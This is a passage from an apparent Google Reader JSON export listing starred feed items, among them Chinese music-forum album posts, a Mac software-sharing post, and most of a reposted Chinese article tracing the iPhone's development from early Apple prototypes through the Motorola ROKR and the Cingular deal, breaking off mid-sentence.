      "streamId" : "feed/http://feeds.feedburner.com/ruanyifeng",
      "title" : "阮一峰的网络日志",
      "htmlUrl" : "http://www.ruanyifeng.com/blog/"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292338082670",
    "timestampUsec" : "1292338082670354",
    "id" : "tag:google.com,2005:reader/item/af95e5fa4139c089",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Hit*轻音乐大碟" ],
    "title" : "Beethoven &lt;Moonlight Sonata&gt; 贝多芬 补档[115]",
    "published" : 1292338082,
    "updated" : 1292338082,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-45696.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面 \n \n\n专辑曲目 \n \n\n简介 \n\n月光曲》原名《升C小调钢琴奏鸣曲》，又名《月光奏鸣曲》，创作于1801年，接近于贝多芬创作的成熟期。这部作品有三个乐章：第一乐章，那支叹息的主题融入了他的耳聋疾患，忧郁的思绪。而第二乐章表现了那种回忆的甜梦，也像憧憬未来的蓝图。第三乐章激动的急板。而这部作品最美丽的，便 .."
    },
    "author" : "lsk413",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-20.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292338065608",
    "timestampUsec" : "1292338065608063",
    "id" : "tag:google.com,2005:reader/item/087747392ac946f0",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "华语音乐大碟 " ],
    "title" : "杜雯媞 &lt;孤独的乐章&gt; [DB]",
    "published" : 1292338065,
    "updated" : 1292338065,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-46017.html",
      "type" : "text/html"
    } ],
    "author" : "bjfrj",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-16.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292260105453",
    "timestampUsec" : "1292260105453359",
    "id" : "tag:google.com,2005:reader/item/d0b2c28b17161b1b",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Mac 软件共享" ],
    "title" : "［更新最新版 1.0.10］Dropbox:强大的网盘（115下载链接）另附免费VPN推荐（500M/月）",
    "published" : 1292242186,
    "updated" : 1292242186,
    "alternate" : [ {
      "href" : "http://www.macidea.com/viewthread.php?tid=38414",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "[i=s] 本帖最后由 louyong 于 10/12/18 10:45 AM 编辑 [/i]\n\n36666[/attach]\n\nDropbox_1.0.10.dmg http://u.115.com/file/f064e35e66[/url]\n36674[/attach]\n最好用的推特客户端tweetie_1.2.8 下载 http://u.115.com/file/f0ef6fda2c[/url]\n\n36667[/attach]\n\nVPN 注册 ..."
    },
    "author" : "louyong",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.macidea.com/rss.php?fid=14&auth=b6a0IUCyv%2BVQa%2BrTTTcqsrmvfEClRHf13U8RyW%2BTYctno8vl3hvkSj6G70yjowg",
      "title" : "MacIdea - Mac 软件共享",
      "htmlUrl" : "http://mac.pcbeta.com/forumdisplay.php?fid=14"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1292137443385",
    "timestampUsec" : "1292137443385538",
    "id" : "tag:google.com,2005:reader/item/8b3b3d38a24a233f",
    "categories" : [ "user/07404792466326621424/state/com.google/broadcast", "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "Apple & iOS", "范物闲谈" ],
    "title" : "iPhone 的誕生故事",
    "published" : 1291878055,
    "updated" : 1291878055,
    "alternate" : [ {
      "href" : "http://www.ifanr.com/27414",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p style=\"text-align:center\"><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/1.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:none;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/1_thumb.jpg\" border=\"0\" alt=\"1\" width=\"127\" height=\"240\"></a></p>\n<blockquote><p>StreetSmart 注：这是一篇非常棒的 iPhone 演进历史回顾强文，作者 kouko 是资深的苹果 Geek，为台湾友站 <a href=\"http://whiteappleer.blogspot.com/\">wa+er. 白苹果急救室</a>的站长。征得其同意，全文转载到 ifanr，<a href=\"http://whiteappleer.blogspot.com/2010/12/iphone.html\">原文链接</a>，感谢！</p>\n</blockquote>\n<p>在2006年秋季早晨的一間Apple會議室中，Apple的CEO，Steve Jobs看著一台由200位頂尖工程師花費一年多的時間開發，名為「P2」計畫的原型機。問題並不在這台原型機有多少地方需要修正，而是這東西完全無法運作。</p>\n<p>通話時常斷線、電池在滿電之前就停止充電、軟體極度不穩定、資料常常自行毀損……除此之外還有許多數不盡的問題。在會議結束時，Jobs只是靜靜地看著會議室內無數的工程師們說：「我們還沒能做出一個產品。」</p>\n<p>這句話的效果遠比Jobs發怒要來的恐怖。當Apple的頭目對手下大發雷霆時，場面雖然嚇人，但是對員工來說已經司空見慣。但是這次，相對來說平靜異常的Jobs著實讓人感到毛骨悚然。某個參與那次會議的員工敘述：「這是我在Apple少數幾次感到寒意的時刻。」</p>\n<p>在這之後的三個月，這些參與開發的Apple工程師們經歷了職業生涯中最巨大的壓力。在公司走廊上時常爆發激烈的爭辯、工程師們過著整夜討論程式碼，僅數小時的補眠後便再度開始工作的生活。還有一位產品經理因為關門太用力，導致門把變形將自己鎖在辦公室內，最後同事花了一個多小時才用鋁製球棒將她救出。</p>\n<p>到了2006年12月中，也就是Macworld即將來臨的幾個星期前，Jobs將這個原型機展示給全美最大電信公司的CEO，Stan Sigman。在這場位於Las Vegas Four Seasons酒店的會面中，Jobs展示了這台原型機的鮮豔的大尺寸螢幕、功能強大的瀏覽器以及充滿魅力的使用介面。</p>\n<p>Stan Sigman，一間以傳統派工程學為主流、同時也是全美最大電信公司的CEO，一反常態而且非常熱情的說：「這是我看過最棒的裝置。」</p>\n<p>2007年1月9日，Apple──這間在之前沒有任何手機製造經驗的公司，在Macworld上發表了它的第一隻手機──iPhone。</p>\n<p>大部分的人直到2007年才知道iPhone的存在，不過整個故事早在1980年代就已經慢慢地開始……</p>\n<p><strong><span>iPhone 0.1</span></strong></p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/2.jpg\"><img style=\"padding-left:0px;padding-right:0px;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/2_thumb.jpg\" border=\"0\" alt=\"2\" width=\"480\" height=\"258\"></a></p>\n<p>在 1980年代，Apple對新產品與新市場充滿許多瘋狂的想法。在當時，Steve Jobs才正開始享受整個創作的過程。沒有人知道這一切是怎麼開始的，也沒有人清楚在過程中究竟但生出多少的原型機。不過在經過了許久之後，有一小部分的原型機被公開。其中有一個由Hartmut Esslinger設計，用於辦公環境的觸控螢幕電話原型機。設計者的兒子現在聲稱，有許多第一次在這台原型機上出現的想法在幕後促使了iPhone的成功。</p>\n<p>先不論這是否為事實。不過在一般的認知上來說，Steve Jobs已在觸控螢幕的研發上花費了許多年的時間，並利用任何機會在Apple內推動相關的產品。例如Newton這個產品，其中許多的解決方案影響到今日的通訊器材與智慧型手機。</p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/3.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:right;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/3_thumb.jpg\" border=\"0\" alt=\"3\" width=\"173\" height=\"240\" align=\"right\"></a></p>\n<p>而第一個能夠與Apple聯想在一起的電話設計是一支手機，它實際上就像……一個蘋果。由今日的觀點來看，這是完全不可能成功的概念。不過在 1982年，這設計就是一個簡單的蘋果。在這份專利中，設計者為Denni Rivette 與 Harry Disko，在當年他們遞交了11份專利，並在1985年公開。這設計實際上並不是設計一支電話，而是在設計時尚。在Apple正四處尋找不同方向的時期，這種專利並不會讓人驚訝。而在之後，公司的發展開始停滯不前，而電話設計就被暫時擱置在一邊了。</p>\n<p><strong><span>iPod、PDA、手機</span></strong></p>\n<p>到了2000年開始，整個市場產生了巨大的改變，手機變成了最新的時尚，整個市場只會越來越蓬勃。<span></span>而在當時，Apple並沒有任何手機製造的經驗與技術，公司也很難掛跨入這塊由電信業者所主導的市場。於是，Apple選擇專注在另一塊可行並擁有巨大潛力的市場──數位音樂播放器。到了2001年10 月23日，Apple發表了它的第一台數位音樂播放器──iPod。</p>\n<p>在2002年，iPod逐漸流行，並開始成為一種文化現象的同時，Jobs看到數百萬人隨身帶著各種手機或是BlackBerry。而對消費者來說，MP3播放器只是另一台裝置。同時他也預期在不久之後，手機或是移動電子郵件裝置將會整合越來越多功能，最終將挑戰iPod在音樂播放器市場中的主宰地位。為了保衛iPod這個新產品線，Jobs理解到最終必須要冒險進入無線通訊市場。</p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/4.png\"><img style=\"padding-left:0px;padding-right:0px;float:left;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/4_thumb.png\" border=\"0\" alt=\"4\" width=\"180\" height=\"240\" align=\"left\"></a></p>\n<p>雖然這樣的想法是顯而易見的，但是在當時，數據通信網路的速度還很緩慢，還無法完全應付網路裝置。而設計新的手機同時需要一個新的作業系統，iPod的OS並無法管理複雜的網路或是圖像，就算是精簡版的OS X也是當時手機晶片所無法應付的。</p>\n<p>隨後，他們研發出一個手機原型，這個原型嵌入在一台iPod內，並使用轉盤來撥號。但是轉盤只能用來選擇號碼並撥打電話，無法用來瀏覽網路。這台原型機被稱為「Purple 1」。</p>\n<p>「Purple 1」很快地被放棄 ，因為這樣的產品沒有任何的創新，無法打動消費者。</p>\n<p>而在2003年的All Things Digital上，Jobs公開表示：</p>\n<blockquote><p>“I get a lot of pressure to do a PDA. What people really seem to want to do with these is get the data out. We believe cellphones are going to carry this information. We didn’t think we’d do well in the cellphone business. What we’ve done instead is we’ve written what we think is some of the best software in the world to start syncing information between devices. We believe that mode is what cellphones need to get to. We chose to do the iPod instead of a PDA.”</p>\n<p>在生產PDA方面，我得到了許多壓力。人們真的想做的是將資料帶出門。我們相信手機將會攜帶這些資訊。我們並不認為我們能在手機市場中做的很好。相反地，我們撰寫了一些我們覺得最好的軟體來將資訊在這些裝置間同步。我們認為這種模式是手機需要的。我們選擇製造iPod，而不是PDA。</p>\n</blockquote>\n<p>在2003年末，消費者湧向Palm Treo 600。這款整合了手機、BlackBerry以及PDA的裝置，恰好印證了更多功能在未來將整合到手機內的事實。</p>\n<p><strong><span>Apple 與 Motorola</span></strong></p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/5.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:right;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/5_thumb.jpg\" border=\"0\" alt=\"5\" width=\"161\" height=\"161\" align=\"right\"></a></p>\n<p>2004年1月，當時Ed Zander才剛成為Motorola的新任CEO。Ed Zander是矽谷的風險投資家以及Sun前任總裁，並與Jobs認識多年。當Jobs打電話祝賀Ed Zander上任時，自然而然地便談到如何互相合作的問題。</p>\n<p>對Zander來說，當時他的任務是要為Motorola注入一股新的活力，與iPod的合作也可以讓正在開發中的RAZR更具吸引力。</p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/6.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:left;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/6_thumb.jpg\" border=\"0\" alt=\"6\" width=\"135\" height=\"240\" align=\"left\"></a>而對Jobs而言，與Motorola的合作關係可以緩和手機市場對iPod的威脅。雖然iPod在當年已經主導了美國音樂播放器的市場，市場也預期整年度將會在全球售出7,500萬台音樂播放器，但是手機的銷量將會是這數字的十倍。如果音樂播放功能變成手機的標準配備，將會對iPod造成巨大的威脅。與手機製造商的合作可以讓Apple進入這塊市場，同時保護iPod這個品牌。</p>\n<p>因此，兩家公司的根本目標不盡相同。Motorola想要將iPod整合到手機內，獲得更大的銷量。而Apple則設法保護iPod，避免受到來自手機市場的威脅。</p>\n<p>在最後，據說是Zander對Jobs說的這句話讓兩家公司正式展開合作關係：</p>\n<blockquote><p>“When you’re leaving your house, you make sure you have three things. Your keys, your wallet and your cell phone. Your iPod isn’t on that list.”</p>\n<p>當你出門時，你會確定帶齊了三樣東西。你的鑰匙、錢包與手機。你的iPod不在這張清單內。</p>\n</blockquote>\n<p>2004年6月初，Apple與Motorola之間簽訂了初步的合作協議。第一次會議馬上顯現出兩家公司在企業文化與商業策略上的巨大差異，並直接影響到最終的產品。</p>\n<p>協議是，由Apple負責音樂軟體，而Motorola負責硬體的細節。</p>\n<p>隨後由於來自Motorola方面的壓力，Apple極其罕見地提前宣布未來的產品計畫，並在2004年7月26日與Motorola發佈聯合新聞稿。新聞稿中除了宣布將在美國市場內提供數款機種之外，並沒有提及其他具體事項。</p>\n<blockquote><p>“Motorola, Inc. and Apple® today announced they are partnering to enable millions of music lovers to transfer their favorite songs from the iTunes® jukebox on their PC or Mac®, including songs from the iTunes Music Store, to Motorola’s next-generation “always with you” mobile handsets, via a USB or Bluetooth connection. Apple will create a new iTunes mobile music player, which Motorola will make the standard music application on all their mass-market music phones, expected to be available in the first half of next year”.</p>\n<p>Motorola與Apple今天宣布合作，將讓讓數百萬的音樂愛好者們可以將他們喜歡的歌曲，包含從iTunes上下載的歌曲，從PC或Mac上的iTunes透過USB或藍芽傳送到Motorola下一代的「always with you」系列手機上。Apple將創造全新的手機版iTunes播放軟體，而Motorola將會把該軟體作為大眾市場向音樂手機的標準播放器，預計將會在明年前半年開始提供。</p>\n</blockquote>\n<p>在新聞稿發佈後，Apple的股價隨即飆升，與Apple手機相關的謠言也開始迅速地蔓延。許多人開始瘋狂製作Apple手機的假想設計，並期望著Apple將再次帶來令人驚奇的產品。</p>\n<p><strong>ROKR</strong></p>\n<p>Apple方面最初想定Motorola將會設計出當時最熱門的超薄手機「RAZR」的後繼機種，但是整個狀況卻完全不是如此。由於RAZR最初的設計並不是音樂手機，Motorola拒絕將iTunes整合到RAZR內。而Motorola的Jeffrey Frost判斷，為了有效利用Apple的資源以及品牌力量，必須建立一個音樂手機用的新產品線。其後，這個新產品線被稱為「ROKR」。</p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/7.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:right;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/7_thumb.jpg\" border=\"0\" alt=\"7\" width=\"193\" height=\"193\" align=\"right\"></a></p>\n<p>ROKR的硬體以Motorola當時已上市的音樂手機E398為基礎。E398內建當時市場上少見的雙喇叭、情境燈光以及造型體面的耳機，並被認為有巨大的市場潛力，但是Apple並不喜歡這個已經上市的硬體。Jobs想要的是能夠震驚大眾的新產品，使用已上市的硬體為基礎的產品無法辦到這點，這是任何人都知道的事。</p>\n<p>但是為了跨入電信市場，Apple不得不答應Motorola的條件，整個計畫變成開發一個E398用的iTunes播放軟體，雖然在期間也有討論過未來的產品，不過Motorola依然無法提供一個完整的ROKR產品線計畫，而整個計畫每星期也不斷地被變更。</p>\n<p>最後Motorola的作法是：「做出一個iTunes播放軟體，然後再決定要放在哪個地方。」Apple對此感到訝異，不過依然保持沉默。</p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/8.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:left;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/8_thumb.jpg\" border=\"0\" alt=\"8\" width=\"134\" height=\"144\" align=\"left\"></a></p>\n<p>Apple轉而積極說服Motorola與電信營運商溝通，並間接促使電信營運商加入ROKR的開發過程。Apple在意的並不是電信營運商的銷售模式，而是盡最大的努力來與電信營運商建立關係。</p>\n<p>Motorola建議與Cingular Wireless合作，來將ROKR推入市場。這兩家公司歷來有著相當不錯的合作關係，而且Cingular的網路覆蓋範圍廣，營收也相當高。而在 2004年，電信營運商的重點還沒有放到數據傳輸服務，因為相關的網路建設要到2006～2007年後才完成。因此，當時他們感興趣的是一些高價、能夠提供一些與通信無關的特別功能的產品。而Motorola與Apple提出的邀請似乎能夠提供Cingular想要的東西。</p>\n<p>於是，Apple的員工開始在會議中與營運商建立關係，並開始踏入新的領域──電信業界。雖然在此時Apple並沒有活躍的成績出現，不過第一個目的──向電信營運商自我介紹並與相關人士建立關係──已經達成，這些成果將在未來得到機會運用。</p>\n<p>但是，Cingular的加入對ROKR的開發本身並沒有幫助。在之後的開發過程中，Motorola與Cingular時常為了一些硬體的小細節（例如公司的商標在機身上放置的位置）僵持不下，而Apple則想盡辦法限制iTunes軟體的功能，來減低對iPod的威脅。</p>\n<p><strong><span>Screw the nano！</span></strong></p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/9.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:right;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/9_thumb.jpg\" border=\"0\" alt=\"9\" width=\"75\" height=\"161\" align=\"right\"></a>在2005年9月7日，由Apple舉辦的Special Event中，Steve Jobs正式發佈了ROKR E1，他將ROKR描述為「一個在手機中的iPod shuffle。」</p>\n<p>ROKR E1無法直接下載音樂，必須要連接電腦來將歌曲傳送到手機上，手機上只能保存100首音樂，這讓所有的消費者大失所望。這是電信業界與Apple複雜的利益衝突所產生出的作品。Wired最後在2005年11月的封面標題中，將這隻手機總結為「YOU CALL THIS THE PHONE OF THE FUTURE?（你把這隻手機稱為未來的趨勢？）」。</p>\n<p><br></p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/10.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:left;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/10_thumb.jpg\" border=\"0\" alt=\"10\" width=\"85\" height=\"179\" align=\"left\"></a>而在ROKR發表後20分鐘左右，Steve Jobs接著發表了當時最受歡迎的MP3播放器──iPod mini的後繼產品「iPod nano」。</p>\n<p>iPod nano可以儲存1000首歌曲，而重量42g、厚度僅6.9mm，並且承襲了iPod一貫以來的俐落外型。在發表會演講結束後的媒體試用區，iPod nano佔據的空間為ROKR的兩倍，再次顯現出兩者間強烈的差距。</p>\n<p>在ROKR E1與iPod nano發表約三週後，Motorola的CEO，Ed Zander接受訪問時對iPod nano的批評如下：</p>\n<blockquote><p>“Screw the nano! What the hell does the nano do? Who listens to 1,000 songs? People are going to want devices that do more than just play music, something that can be seen in many other countries with more advanced mobile phone networks and savvy users,”</p>\n<p>去他的nano！這東西有啥用處？誰會聽1,000首歌？人們想要的不是只能播放音樂的裝置，而是在那些有更先進的電話網路與精明使用者的國家可以看到的產品。</p>\n</blockquote>\n<p>截至2006年11月為止，Motorola共售出了約100萬台內建iTunes的手機，同年度iPod nano單季的銷量為這數字的七倍。而大眾的反應方面，雖然仍有不少ROKR的愛好者，不過許多人都認為ROKR的失敗是Motorola的問題，這一系列的手機並不被當成是Apple的作品。</p>\n<p><strong><span>Apple &amp; Cingular</span></strong></p>\n<p>而ROKR與iPod nano正式公開的7個月前，也就是2005年二月。在一家位於Manhattan的酒店中，Steve Jobs與Cingular的管理階層，包括其CEO Stan Sigman，開始討論將Motorola排除在外，只有Apple與Cingular兩家公司的合作計畫。</p>\n<p>Steve Jobs向Cingular展示的計畫主要有三個重點：</p>\n<ul>\n<li>Apple有足夠的技術來打造極具革命性的裝置，並比市面上的任何裝置還要先進N個光年。 </li>\n<li>Apple計畫簽訂獨家合約。 </li>\n<li>Apple同時準備大量購買無線通話時數，並成為實際上的電信營運商。 </li>\n</ul>\n<p>在此同時，Jobs也非常明確地表示，他將會與任何願意合作的電信商簽約。</p>\n<p>Jobs有理由對此充滿信心。Apple當時已經花費了一年以上的時間在平板電腦的觸控螢幕技術，並且自信可以開發出類似的介面供手機使用。</p>\n<p>另外，由於持續進步的ARM晶片，手機用的處理晶片終於同時具有足夠的效能與省電能力，可以同時處理手機、電腦與iPod的功能。</p>\n<p>而無線通話時數的單位價格已經大幅降低到可以讓Apple以轉售的方式提供給消費者，同樣的模式已經有Virgin這家公司在運作著。</p>\n<p>Sigman與他的團隊立刻被這個概念吸引。Cingular，或是說當時所有的電信營運商，都由於語音通信激烈的價格戰導致獲利率不斷下降，因而將策略轉為促使消費者使用手機瀏覽網路，來產生數據通信費用獲利。Apple的裝置號稱能夠使用Wi-Fi等級的速度來下載音樂、影片或是瀏覽網頁，可以讓消費者使用到大量的數據通信。而大量的數據通信，代表著大量的獲利。</p>\n<p>再者，Cingular已經預見到整個無線電信業的商業模式必須有所改變。從前營運商視自己的網路為珍寶，而完全沒有重視手機終端的價值。從前的模式──利用補貼提供廉價的手機給消費者，藉此讓他們輕易地簽約並成為長期客戶，這個方式已經漸漸地失效。手機不再是奢侈的炫耀品，而成為了日常生活的必備工具。</p>\n<p>營運商最大的問題在於已經發掘不出新的使用者，市場已成為互相搶奪客戶的狀況。單單利用廉價手機來吸引客戶的方式已經行不通了，他們必須提供其他營運商無法提供的裝置。在這方面來說，沒有人比Steve Jobs更擅長了。</p>\n<p>但是，Sigman同時也對Apple的野心感到擔憂。雖然與Apple的合作可以帶給自身品牌更多的魅力，但是沒有一個電信商曾經將Jobs要求的控制權與自由度下放給他們的合作對象。而在此同時，Apple還沒有任何實際的產品可以向Cingular展示。要在這種狀況下說服Cingular內部以及董事會變的相當地困難。</p>\n<p><strong><span>P2</span></strong></p>\n<p>回到2004年初，Apple當時並沒有與手機相關的計畫。相反地，在Apple內部有一個平板電腦的設計。當時Apple正致力於多點觸控螢幕以及相關的介面設計上。根據Jobs在All Things D 2010上的公開敘述：</p>\n<blockquote><p>“I’ll tell you. Actually, it started on a tablet first. I had this idea about having a glass display, a multi-touch display you could type on. I asked our people about it. And six months later they came back with this amazing display. And I gave it to one of our really brilliant UI guys. He then got inertial scrolling working and some other things, and I thought, ‘my god, we can build a phone with this’ and we put the tablet aside, and we went to work on the phone.”</p>\n<p>實際上，這一切開始於平板裝置。我想到可以有一個玻璃螢幕、並有多點觸控功能讓人可以在上面打字。我向我們的人詢問這種可能性。在六個月後，他們回來並帶著這個驚人的螢幕。我將這螢幕拿給我們負責介面的聰明傢伙們，他們做出了慣性滾輪與其他的東西。接著我想到：『天啊！我們可以用這東西來做出一支手機。』於是我們將平板裝置放到一邊，開始進行手機的研發。</p>\n</blockquote>\n<p>而在Steve Jobs試著直接與電信商談判的同時，Apple內部則開始自行研發手機。在2005年9月，整個計畫逐漸開始成形，並有約200位的工程師參與整個研發。同年11月的感恩節前後，Apple開始全力發展此計畫。如果與Cingular的談判順利，Apple只需要專注在裝置的研發上。</p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/11.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:right;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/11_thumb.jpg\" border=\"0\" alt=\"11\" width=\"203\" height=\"203\" align=\"right\"></a></p>\n<p>第一個問題是：「該用哪種作業系統？」。從2002年Apple打算進入手機市場後，行動裝置用的晶片已經越來越強大，在理論上已經可以執行某些版本的Mac OS。不過軟體仍然需要被精簡並重新撰寫，一個手機用作業系統的大小因該只有數百MB，而不是數GB大小的OS X。</p>\n<p>在開始進行實際設計之前，Jobs與其他管理階層必須先解決這個問題。工程師們謹慎地評估了Linux──這個已經在其他手機產品中被使用的作業系統，但是Jobs拒絕使用其他人的軟體。</p>\n<p>於是到了2006年初，正當Apple結束了為期一年，將OS X從Power PC轉移到Intel CPU的專案之後，工程師們立刻再一次重新改寫OS X，來配合新研發的手機裝置。</p>\n<p>在Apple管理階層的討論中，作業系統是至少是他們都熟悉的部份。而其他關於手機設計方面的複雜工程則較少被討論到，例如天線設計、射頻輻射、網路模擬等。</p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/12.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:none;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/12_thumb.jpg\" border=\"0\" alt=\"12\" width=\"480\" height=\"300\"></a></p>\n<p>為了保證設計中的微型天線能夠正常動作，Apple花費數百萬美金購買特別設計的機器人，並建構了測試用實驗室。為了確保不會產生過多的輻射，Apple製作了人頭模型，並在其中填入膠狀物模擬人腦密度，來測試輻射的影響。為了測量網路效能，Apple的工程師買了將近一打，每個價值數百萬美金的射頻模擬器。</p>\n<p>而先前設計iPod螢幕的經驗也沒派上太多的用場。為了盡量減少刮痕，螢幕必須要使用玻璃，而不是原先iPod所用的硬質塑膠。根據業界人士估計，Apple大約花費了1.5億美金來研發。</p>\n<p>而在研發的同時，Apple也持續保密這項計畫。在Apple內部，這整個專案名稱為Purple 2，簡稱「P2」。研發團隊被分散到Apple總部園區內。當Apple高層前往Cingular進行會議時，他們偽裝成Infineon的員工。而整個硬體與軟體開發團隊也被拆開，硬體工程師僅使用偽裝的軟體與來進行測試、軟體工程師則面對著裝在木箱中的電路板。</p>\n<p>在正式公開之前，大約只有30個人知道整個計畫的全貌。</p>\n<p><strong><span>與Cingular正式簽約從</span></strong></p>\n<p>2005年2月Apple與Cingular第一次會議之後，整個協商過程持續地進行著。在這段期間，Sigman與他的團隊們不斷地懷疑他們是否做出太多的讓步。</p>\n<p>有一次，Jobs與Verizon的部份高層會面，他們立刻拒絕了Jobs。這並不代表Verizon錯了，而是在經過多年來由電信商主導的市場後，突然要將自己所建立的品牌以及網路變成單純提供內容的渠道，而不是內容的提供者。這種在意識型態上的根本改變，對電信商來說是相當困難的。</p>\n<p>Sigman的團隊最後做出了一個簡單的結論──Apple的新手機所帶來的數據通信流量收入，將會超過由這筆交易所帶來的其他損失。</p>\n<p>到了2006年7月，兩家公司正式簽訂了合作協議。Cingular藉由投入一定金額到相關的行銷與廣告活動，來換取為期五年的獨佔販售權。在協議中同時也包含客戶從iTunes Store消費的相關權利金，Apple要為每個手機使用者付出10美金，這項費用被認為是流量費用，因為兩家公司都預計使用者將會大量使用網路與 email。</p>\n<p>而在正式簽約時，Sigman甚至還沒有看過任何Apple的原型機，此時距離正式發表還有6個月。</p>\n<p><strong><span>發佈前夕</span></strong></p>\n<p>到了2006年秋季，Apple還無法製作出一台穩定可工作的原型。通話時常斷線、電池在滿電之前就停止充電、軟體極度不穩定、資料常常自行毀損……除此之外還有許多數不盡的問題。</p>\n<p>在這之後的三個月，這些參與開發的Apple工程師們經歷了職業生涯中最巨大的壓力，所有的人都拼命的在趕工。當時Apple最新的作業系統 ──Mac OS X 10.5 Leopard已經正式宣布延期，如果在2006年結束前還無法將手機準備完成，隔年一月的Macworld將沒有任何新產品可以發表。這將會造成支持者對Apple的猛烈批評，而Apple的股價也會受到嚴重的影響。</p>\n<p>到了2006年12月中，也就是Macworld即將來臨的幾個星期前，Jobs終於將P2原型機展示給Sigman的CEO，Stan Sigman。在這場位於Las Vegas Four Seasons酒店的會面中，Jobs展示了這台原型機的鮮豔的螢幕、功能強大的瀏覽器以及充滿魅力的使用介面。</p>\n<p>Stan Sigman，一間以傳統派工程學為主流、同時也是全美最大電信公司的CEO，一反常態而且非常熱情的說：「這是我看過最棒的裝置。」</p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/13.png\"><img style=\"padding-left:0px;padding-right:0px;float:none;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/13_thumb.png\" border=\"0\" alt=\"13\" width=\"480\" height=\"279\"></a></p>\n<p><strong><span>iPhone正式發表</span></strong></p>\n<p>在2007年1月9日的Macworld上，Apple正式發表了它的第一隻手機──iPhone。</p>\n<p>iPhone捨棄了實體鍵盤，搭載著大尺寸、幾乎佔滿整個機身正面的螢幕，並擁有先進的多點觸控技術，以及大家從來都沒看過的慣性滾輪介面。除了與 iPod相同，可播放音樂與影片之外，還搭載了完整功能的Safari瀏覽器、 Google Map、以及利用多點觸控介面設計，方便使用的行事曆、電話簿與eMail功能。</p>\n<p>大眾的反應相當熱烈，雖然距離正式上市還有六個月的時間，但是所有人都迫不及待地想要把玩iPhone。</p>\n<p>不過此時，iPhone還尚未完成。</p>\n<p><a href=\"http://www.ifanr.com/wp-content/uploads/2010/12/14.jpg\"><img style=\"padding-left:0px;padding-right:0px;float:right;padding-top:0px;border-width:0px\" src=\"http://www.ifanr.com/wp-content/uploads/2010/12/14_thumb.jpg\" border=\"0\" alt=\"14\" width=\"240\" height=\"180\" align=\"right\"></a></p>\n<p>Apple在Macworld發表時，還不確定iPhone是否真的要使用玻璃螢幕面板來取代塑膠材質，而最初發表的電池規格與最終規格的差異也非常的大。這些跡象顯示出iPhone的研發非常的緊迫，在時間上幾乎沒有任何的餘裕。</p>\n<p>而在大眾引頸期盼的六個月間，充滿各種與iPhone相關的謠言，而與Cisco的商標糾紛也持續困擾著Apple。</p>\n<p><strong><span>Engadget與40億美金</span></strong></p>\n<p>到了2007年5月16日，Engadget發佈了一則來源為Apple內部email的消息，該email內容指出Apple將延後Mac OS X 